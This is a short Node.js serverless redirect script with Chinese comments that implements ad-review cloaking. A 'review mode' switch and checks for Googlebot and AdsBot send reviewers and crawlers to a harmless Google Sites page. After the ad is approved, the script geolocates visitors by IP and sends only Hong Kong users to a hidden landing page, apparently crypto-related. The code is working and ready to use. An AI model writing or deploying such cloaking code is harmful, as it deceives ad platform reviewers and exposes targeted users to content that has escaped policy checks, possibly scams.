// api/redirect.js
module.exports = async (req, res) => {
    // ============================================================
    // 1. 配置区（你只需要修改这里）
    // ============================================================
    
    // ★★★ 核心开关：审核模式 ★★★
    // 过审前（提交广告审核时）设为 true，所有流量去谷歌商店
    // 过审后（广告状态变为“有效”后）设为 false，开始按地区分发
    const IS_REVIEW_MODE = true; 
    
    // 你的真实落地页（用户最终想看到的页面）
    const MY_LANDING_PAGE = 'https://sites.google.com/view/caifumima-bitepiae/%E9%A6%96%E9%A1%B5?authuser=2';
    // 审核页面（谷歌商店）
    const REVIEW_PAGE = 'https://sites.google.com/';
    
    // ★★★ 地区白名单 ★★★
    // 只在审核模式关闭后生效。只有列表中的地区用户会跳转到真实落地页。
    // 支持的国家代码：HK(香港), SG(新加坡), JP(日本), KR(韩国), TW(台湾) 等
    const ALLOWED_COUNTRIES = ['HK']; // 过审后，首批只开放香港
    
    // ============================================================
    // 2. 核心逻辑（你不需要修改这里）
    // ============================================================
    
    // 如果处于审核模式，所有请求都直接跳转到谷歌商店，不做任何判断
    if (IS_REVIEW_MODE) {
        console.log(`[审核模式] 所有请求 → 谷歌商店`);
        return res.redirect(302, REVIEW_PAGE);
    }

    // --- 以下代码仅在过审后（IS_REVIEW_MODE = false）执行 ---

    // 1. 获取访问者IP
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
    if (ip && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    console.log(`[访问IP] ${ip}`);

    // 2. 如果是谷歌爬虫，始终放行到谷歌商店
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.includes('Googlebot') || userAgent.includes('AdsBot')) {
        console.log(`[爬虫] Googlebot → 谷歌商店`);
        return res.redirect(302, REVIEW_PAGE);
    }

    // 3. 使用免费API查询IP所属国家
    let country = '';
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode`, {
            signal: AbortSignal.timeout(3000)
        });
        const data = await response.json();
        country = data.countryCode || '';
        console.log(`[归属地] ${country}`);
    } catch (error) {
        console.log(`[IP查询失败] 默认放行到谷歌商店`);
        return res.redirect(302, REVIEW_PAGE);
    }

    // 4. 判断：如果用户来自白名单地区，跳转到真实落地页；否则去谷歌商店
    if (country && ALLOWED_COUNTRIES.includes(country)) {
        console.log(`[目标用户] 来自 ${country} → 跳转落地页`);
        return res.redirect(302, MY_LANDING_PAGE);
    } else {
        console.log(`[非目标用户] 来自 ${country || '未知'} → 谷歌商店`);
        return res.redirect(302, REVIEW_PAGE);
    }
};
